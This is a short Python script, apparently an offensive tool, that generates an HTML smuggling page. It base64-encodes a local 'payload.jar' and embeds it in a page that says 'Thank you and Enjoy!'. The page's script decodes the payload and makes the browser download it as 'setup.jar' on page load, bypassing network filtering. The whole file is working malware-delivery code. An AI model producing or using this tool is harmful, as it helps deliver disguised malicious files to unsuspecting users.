import base64

def parseHtml(payload):
    html = "<html>"
    html += "<head></head>"
    html += "<body>"
    html += "<h2>Thank you and <b> Enjoy! </b></h2>"
    html += "<script>"
    html += "const link = document.createElement(\"a\");"
    html += f"const content = atob(\"{payload}\");"
    html += "const file = new Blob([content], { type: 'text/plain' });"
    html += "link.href = URL.createObjectURL(file);"
    html += "link.download = \"setup.jar\";"
    html += "link.click();"
    html += "URL.revokeObjectURL(link.href);"
    html += "</script>"
    html += "</body>"
    html += "</html>"

    return html

def read_payload():
    path = "./data/payload.jar"

    try:
        with open(path, "rb") as file:
            data = file.read()
            b64_bytes = base64.b64encode(data)

            return b64_bytes.decode("ascii")

    except FileNotFoundError:
        print(f"Payload not found at {path}")
    
    except Exception:
        print("Unexpected error while reading payload.")

    return None

def main():
    try:
        payload = read_payload()

        if payload:
            html = parseHtml(payload)

            filename = "payload_smuggler.html"
            with open(filename, "w") as file:
                file.writelines(html)
                file.flush()

            print(f"Output saved to ./{filename}")

    except Exception as ex:
        print("Unexpected error while generating smuggler.")

if __name__=="__main__":
    main()